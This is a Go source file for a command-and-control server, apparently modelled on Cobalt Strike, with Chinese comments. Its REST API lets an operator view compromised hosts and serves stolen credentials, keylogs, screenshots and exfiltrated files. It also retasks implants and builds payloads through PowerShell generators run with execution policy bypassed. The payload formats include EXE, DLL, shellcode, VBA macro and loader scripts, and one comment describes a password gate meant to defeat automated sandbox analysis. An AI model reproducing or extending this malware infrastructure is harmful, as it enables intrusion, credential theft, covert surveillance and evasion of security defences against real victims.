// csdev :: v2_api.go  --  REST API (GUI 契约)
//
// 见 docs/protocol_v2.md 第 9 节。
package main

import (
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"
)

// ---------------------------------------------------------------- 路径

// 定位项目根目录 (含 tools/gen_payload.ps1 的目录)
var devRoot = "."
var serverAddr = "0.0.0.0:8443"

func findDevRoot() string {
	dir, err := os.Executable()
	if err != nil {
		return "."
	}
	d := filepath.Dir(dir)
	for i := 0; i < 5; i++ {
		if _, err := os.Stat(filepath.Join(d, "tools", "gen_payload.ps1")); err == nil {
			return d
		}
		p := filepath.Dir(d)
		if p == d {
			break
		}
		d = p
	}
	// 退化: 当前目录
	if wd, err := os.Getwd(); err == nil {
		return wd
	}
	return "."
}

// 公钥指纹: PUBLICKEYBLOB 前 8 字节 SHA-256 (用于人工核对生成器与植入体是否同源)
func pubkeyFingerprint(blob []byte) string {
	h := sha256.Sum256(blob)
	return hex.EncodeToString(h[:8])
}

// ---------------------------------------------------------------- 会话行

func sessionsRows() []map[string]interface{} {
	now := time.Now().Unix()
	out := []map[string]interface{}{}
	for _, s := range st.list() {
		out = append(out, map[string]interface{}{
			"sid": s.ID, "proto": "v1", "host": s.Host, "user": s.User,
			"arch": s.Arch, "addr": s.Addr, "idle": now - s.Last,
			"has_task": s.HasTask, "pid": uint32(0), "ppid": uint32(0),
			"proc": "", "os": "", "sleep": uint32(5000), "jitter": uint8(0),
		})
	}
	out = append(out, v2SessionList()...)
	sort.Slice(out, func(i, j int) bool {
		return out[i]["sid"].(string) < out[j]["sid"].(string)
	})
	return out
}

// ---------------------------------------------------------------- 监听器

type ListenerInfo struct {
	Name  string `json:"name"`
	Type  string `json:"type"`  // http / https / tcp / smb / dns / external
	Proto string `json:"proto"` // v2 / v1
	Host  string `json:"host"`
	Port  int    `json:"port"`
	URI   string `json:"uri"`
	SSL   bool   `json:"ssl"`
	Up    bool   `json:"up"`

	// ---- 运行期 listener 管理追加字段 (见 listener_admin.go) ----
	// 前 8 个字段是 GUI 在用的既有契约, 一个都不能少; 以下为只增不改的追加项。
	ID         string `json:"id"`         // 注册表 id, 删除时用它 ("main" 为主入口, 受保护)
	Kind       string `json:"kind"`       // http/https/tcp/smb/dns/extc2
	Addr       string `json:"addr"`       // 规范化地址 (smb 为管道路径)
	Created    int64  `json:"created"`    // 登记时间 (unix 秒)
	Status     string `json:"status"`     // up / down
	Conns      int    `json:"sessions"`   // 长连接通道数 (HTTP 为短连接, 恒为 0)
	Protected  bool   `json:"protected"`  // true = 不允许通过 API 删除
	Manageable bool   `json:"manageable"` // 与 protected 相反, 便于前端直接判按钮态
}

var gProfileName = "default"

func currentProfileName() string { return gProfileName }

func handleListeners(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, map[string]interface{}{"ok": true, "listeners": listenerList()})
}

// ---------------------------------------------------------------- 状态

func handleState(w http.ResponseWriter, r *http.Request) {
	rows := sessionsRows()
	writeJSON(w, map[string]interface{}{
		"ok":          true,
		"host":        serverAddr,
		"proto_v2":    true,
		"sessions":    rows,
		"listeners":   listenerList(),
		"credentials": storeCreds(),
		"downloads":   storeDownloads(),
		"screenshots": storeScreenshots(),
		"keylogs":     storeKeylogs(),
		"events":      storeEvents(300),
		"profile":     currentProfileName(),
		"profile_detail": profileSummary(),
		"targets":        storeTargets(),
		"proxy":          proxyList(),
		"scripts":        scriptSummary(),
		"jobs":           bgJobAll(),
		"jobs_running":   bgJobRunningCount(""),
		"stats": map[string]int{
			"sessions":    len(rows),
			"credentials": len(storeCreds()),
			"downloads":   len(storeDownloads()),
			"screenshots": len(storeScreenshots()),
		},
	})
}

// ---------------------------------------------------------------- 记录查询

func handleCredentials(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, map[string]interface{}{"ok": true, "credentials": storeCreds()})
}

func handleDownloads(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, map[string]interface{}{"ok": true, "downloads": storeDownloads()})
}

func handleScreenshots(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, map[string]interface{}{"ok": true, "screenshots": storeScreenshots()})
}

func handleKeylogs(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, map[string]interface{}{"ok": true, "keylogs": storeKeylogs()})
}

func handleEventlog(w http.ResponseWriter, r *http.Request) {
	n, _ := strconv.Atoi(r.URL.Query().Get("limit"))
	if n <= 0 {
		n = 300
	}
	writeJSON(w, map[string]interface{}{"ok": true, "events": storeEvents(n)})
}

// 下载文件内容 (GUI 预览/另存)
func handleDownloadFile(w http.ResponseWriter, r *http.Request) {
	id, _ := strconv.ParseUint(r.URL.Query().Get("id"), 10, 64)
	for _, d := range storeDownloads() {
		if d.ID == id {
			http.ServeFile(w, r, d.Path)
			return
		}
	}
	http.NotFound(w, r)
}

func handleScreenshotFile(w http.ResponseWriter, r *http.Request) {
	id, _ := strconv.ParseUint(r.URL.Query().Get("id"), 10, 64)
	for _, s := range storeScreenshots() {
		if s.ID == id {
			http.ServeFile(w, r, s.Path)
			return
		}
	}
	http.NotFound(w, r)
}

// ---------------------------------------------------------------- 会话控制

func handleSessionSleep(w http.ResponseWriter, r *http.Request) {
	var req struct {
		SID     string `json:"sid"`
		SleepMS uint32 `json:"sleep_ms"`
		Jitter  uint8  `json:"jitter"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": "bad json"})
		return
	}
	sess := v2st.lookup(req.SID)
	if sess == nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": "仅 v2 会话支持热更新"})
		return
	}
	if req.SleepMS < 100 {
		req.SleepMS = 100
	}
	if req.Jitter > 99 {
		req.Jitter = 99
	}
	sess.SleepMS = req.SleepMS
	sess.Jitter = req.Jitter

	arg := make([]byte, 5)
	binary.BigEndian.PutUint32(arg, req.SleepMS)
	arg[4] = req.Jitter
	id := sess.enqueue(cmdSetSleep, "sleep", arg)
	logf("[>] %s 更新 sleep=%dms jitter=%d%% (task#%d)", sess.ID, req.SleepMS, req.Jitter, id)
	eventLog("operator", sess.ID, "sleep", fmt.Sprintf("%dms/%d%%", req.SleepMS, req.Jitter))
	writeJSON(w, map[string]interface{}{"ok": true})
}

func handleSessionExit(w http.ResponseWriter, r *http.Request) {
	var req struct {
		SID string `json:"sid"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": "bad json"})
		return
	}
	sess := v2st.lookup(req.SID)
	if sess == nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": "no such session"})
		return
	}
	sess.enqueue(cmdExit, "exit", nil)
	eventLog("operator", sess.ID, "exit", "")
	writeJSON(w, map[string]interface{}{"ok": true})
}

// handleSessionCheckin 强制目标立刻心跳一次 (对标 CS 的 checkin)。
// 做法: 临时把 sleep 压到 100ms, 收到该会话下一次上行后再恢复原值。
func handleSessionCheckin(w http.ResponseWriter, r *http.Request) {
	var req struct {
		SID string `json:"sid"`
	}
	if err := decodeJSONBody(r, &req); err != nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": "bad json"})
		return
	}
	sess := v2st.lookup(req.SID)
	if sess == nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": "仅 v2 会话支持 checkin"})
		return
	}

	sess.mu.Lock()
	if !sess.checkinPend {
		sess.checkinSaved = sess.SleepMS
		sess.checkinPend = true
	}
	sess.SleepMS = 100
	sess.mu.Unlock()

	arg := make([]byte, 5)
	binary.BigEndian.PutUint32(arg, 100)
	arg[4] = 5
	id := sess.enqueue(cmdSetSleep, "sleep", arg)

	logf("[>] %s checkin: 临时 sleep=100ms (task#%d), 下次上行后恢复", sess.ID, id)
	eventLog("operator", sess.ID, "checkin", "")
	writeJSON(w, map[string]interface{}{"ok": true, "task": id})
}

// ---------------------------------------------------------------- Payload

type payloadFormat struct {
	ID    string `json:"id"`
	Desc  string `json:"desc"`
	Kind  string `json:"kind"`
	Proto string `json:"proto"`
}

var payloadFormats = []payloadFormat{
	{"win2-exe", "Windows x64 EXE (GUI) — 协议v2", "pe", "v2"},
	{"win2-console", "Windows x64 EXE (控制台) — 协议v2", "pe", "v2"},
	{"win2-dll", "Windows x64 DLL — 协议v2", "pe", "v2"},
	{"win2-svc", "Windows x64 服务程序 — 协议v2", "pe", "v2"},
	{"win2-raw", "Windows x64 shellcode — 协议v2", "bin", "v2"},
	{"win2-ps1", "PowerShell 加载器 — 协议v2", "script", "v2"},
	{"win2-vba", "VBA 宏 — 协议v2", "script", "v2"},
	{"win2-vbs", "VBScript — 协议v2", "script", "v2"},
	{"win2-cs", "C# 加载器 — 协议v2", "script", "v2"},
	/* TCP 直连承载: 与服务端 POST /api/listener/add kind=tcp 配套。
	 * HTTP 承载的载荷投到 TCP listener 上连不上(协议不同, 表现为连上就沉默),
	 * 生成器格式与 listener 类型必须配对。 */
	{"win2-tcp", "Windows x64 EXE (TCP 直连承载) — 协议v2", "pe", "v2"},
	/* Linux 走协议 v2 的 HTTP /submit —— 与 Windows 植入体同一套帧协议。
	 * 注意不要用 v1 的 linux-elf / linux-elf-dyn: 那是**裸 TCP**协议(linux/beacon.c),
	 * 连 HTTP listener 只会建立连接然后各自沉默(实测 CLOSE-WAIT、服务端收不到请求),
	 * 要用它们必须配服务端 --tcp listener。 */
	{"linux2-elf", "Linux x64 ELF (静态) — 协议v2 HTTP", "elf", "v2"},
	{"linux2-dyn", "Linux x64 ELF (动态) — 协议v2 HTTP", "elf", "v2"},
	{"win-exe", "Windows x64 EXE (GUI) — 协议v1", "pe", "v1"},
	{"win-console", "Windows x64 EXE (控制台) — 协议v1", "pe", "v1"},
	{"win-dll", "Windows x64 DLL — 协议v1", "pe", "v1"},
	{"win-raw", "Windows x64 shellcode — 协议v1", "bin", "v1"},
	{"win-ps1", "PowerShell 加载器 — 协议v1", "script", "v1"},
	{"linux-elf", "Linux x64 ELF (静态) — 协议v1 裸TCP", "elf", "v1"},
	{"linux-elf-dyn", "Linux x64 ELF (动态) — 协议v1 裸TCP", "elf", "v1"},
}

func handlePayloadFormats(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, map[string]interface{}{"ok": true, "formats": payloadFormats})
}

func handlePayloadBuild(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Format  string `json:"format"`
		Host    string `json:"host"`
		Port    int    `json:"port"`
		SSL     bool   `json:"ssl"`
		OutFile string `json:"out_file"`
		Sleep   int    `json:"sleep"`
		Jitter  int    `json:"jitter"`
		URI     string `json:"uri"`
		/* Password 非空则启用"启动口令门控": 生成器把 随机盐 + SHA256(盐||口令)
		 * 编进植入体, 运行时必须带这个口令做参数(或设环境变量 CSDEV_TOKEN)才上线。
		 * 自动化沙箱直接执行样本时拿不到任何行为。留空 = 不带门控, 直接运行。 */
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": "bad json"})
		return
	}
	if req.Host == "" {
		writeJSON(w, map[string]interface{}{"ok": false, "error": "缺少 host"})
		return
	}
	if req.Port == 0 {
		req.Port = 8443
	}

	/* 生成器有两个, 参数集与支持格式都不同:
	 *   tools/gen_payload2.ps1 —— 协议 v2, 11 个 win2- 开头的格式, 支持 -Sleep/-Jitter/-Uri
	 *   tools/gen_payload.ps1  —— 协议 v1, win- 与 linux- 开头的格式, 只认 -Dynamic,
	 *                              不认识 -Sleep/-Jitter/-Uri
	 * 早期这里硬绑 gen_payload2.ps1, 于是 GUI 格式列表里的 v1 格式(win-console 等)
	 * 一点就报 "未知格式: win-console"。现在按格式选生成器, 并在报"未知格式"时
	 * 自动换另一个重试一次 —— 与生成器加新格式这件事解耦, 不用维护映射表。 */
	ps1v2 := filepath.Join(devRoot, "tools", "gen_payload2.ps1")
	ps1v1 := filepath.Join(devRoot, "tools", "gen_payload.ps1")
	script := ps1v2
	if !strings.HasPrefix(req.Format, "win2-") {
		script = ps1v1
	}
	if _, err := os.Stat(script); err != nil {
		script = ps1v2 // 目标生成器缺失时退回 v2 那个
	}

	/* 用哪个 PowerShell: 优先 pwsh(7+, 默认 UTF-8), 退回 powershell.exe(5.1, ANSI)。
	 *
	 * 这里踩过一次真实的坑: powershell.exe 读**无 BOM** 的 .ps1 时按系统 ANSI 解码,
	 * 脚本里的中文注释就变成乱码, 引号配对随之错位, 整个脚本解析失败,
	 * 报出来是一堆 "缺少 using 指令" / "「<」运算符保留给将来使用"(来自 here-string 里的 C# 模板)。
	 * 两件事一起修: ① 生成器脚本补 UTF-8 BOM; ② 能用 pwsh 就用 pwsh。 */
	psExe := "pwsh.exe"
	if _, lookErr := exec.LookPath(psExe); lookErr != nil {
		psExe = "powershell.exe"
	}

	buildArgs := func(scriptPath, format string) []string {
		v1 := !strings.HasPrefix(format, "win2-")
		fmtName := format
		a := []string{"-NoProfile", "-ExecutionPolicy", "Bypass", "-File", scriptPath}
		if format == "linux-elf-dyn" {
			// v1 生成器里这是 -Format linux-elf + -Dynamic, 不是独立格式名
			fmtName = "linux-elf"
		}
		a = append(a, "-Format", fmtName, "-Host_", req.Host, "-Port", strconv.Itoa(req.Port))
		if req.SSL {
			a = append(a, "-Ssl")
		}
		if format == "linux-elf-dyn" {
			a = append(a, "-Dynamic")
		}
		if req.OutFile != "" {
			a = append(a, "-OutFile", req.OutFile)
		}
		if !v1 { // v1 生成器没有这三个参数, 传了会直接报错
			if req.Sleep > 0 {
				a = append(a, "-Sleep", strconv.Itoa(req.Sleep))
			}
			if req.Jitter >= 0 {
				a = append(a, "-Jitter", strconv.Itoa(req.Jitter))
			}
			if req.URI != "" {
				a = append(a, "-Uri", req.URI)
			}
			if req.Password != "" {
				a = append(a, "-Password", req.Password)
			}
		}
		return a
	}

	runPS := func(scriptPath string) ([]byte, error) {
		cmd := exec.Command(psExe, buildArgs(scriptPath, req.Format)...)
		cmd.Dir = devRoot
		return cmd.CombinedOutput()
	}

	out, err := runPS(script)
	// 报"未知格式"说明选错了生成器 —— 换另一个再试一次
	if err != nil && strings.Contains(string(ensureUTF8(out)), "未知格式") {
		alt := ps1v1
		if script == ps1v1 {
			alt = ps1v2
		}
		if _, e := os.Stat(alt); e == nil {
			if out2, err2 := runPS(alt); err2 == nil || !strings.Contains(string(ensureUTF8(out2)), "未知格式") {
				out, err, script = out2, err2, alt
			}
		}
	}
	eventLog("operator", "", "生成载荷", req.Format+" "+req.Host+":"+strconv.Itoa(req.Port))
	// PowerShell 的输出编码跟宿主走: 5.1 是 ANSI(中文系统 GBK), 7+ 是 UTF-8。
	// 统一兜底转成 UTF-8, 否则 JSON 里会出现一片 U+FFFD。
	logText := string(ensureUTF8(out))
	writeJSON(w, map[string]interface{}{
		"ok":       err == nil,
		"log":      logText,
		"error":    errStr(err),
		"out":      req.OutFile,
		"format":   req.Format,
		"ps":       psExe,
		"gen":      filepath.Base(script),
	})
}

func errStr(e error) string {
	if e == nil {
		return ""
	}
	return e.Error()
}

// ---------------------------------------------------------------- 其他

func handleKillAll(w http.ResponseWriter, r *http.Request) {
	n := 0
	for _, s := range v2st.list() {
		s.enqueue(cmdExit, "exit", nil)
		n++
	}
	eventLog("operator", "", "Kill All", fmt.Sprintf("%d 个 v2 会话", n))
	writeJSON(w, map[string]interface{}{"ok": true, "count": n})
}

func handleSessionInfo(w http.ResponseWriter, r *http.Request) {
	sid := r.URL.Query().Get("sid")
	if s := v2st.lookup(sid); s != nil {
		writeJSON(w, map[string]interface{}{"ok": true, "session": map[string]interface{}{
			"sid": s.ID, "proto": "v2", "host": s.Host, "user": s.User, "arch": s.Arch,
			"pid": s.PID, "ppid": s.PPID, "proc": s.Proc, "os": s.OSVer,
			"addr": s.Addr, "first": s.First, "last": s.Last,
			"sleep": s.SleepMS, "jitter": s.Jitter,
		}})
		return
	}
	st.mu.RLock()
	s := st.byID[sid]
	st.mu.RUnlock()
	if s == nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": "no such session"})
		return
	}
	writeJSON(w, map[string]interface{}{"ok": true, "session": map[string]interface{}{
		"sid": s.ID, "proto": "v1", "host": s.Host, "user": s.User, "arch": s.Arch,
		"addr": s.Addr, "first": s.First, "last": s.Last, "sleep": 5000, "jitter": 0,
	}})
}

func trimSlash(s string) string { return strings.TrimSuffix(s, "/") }
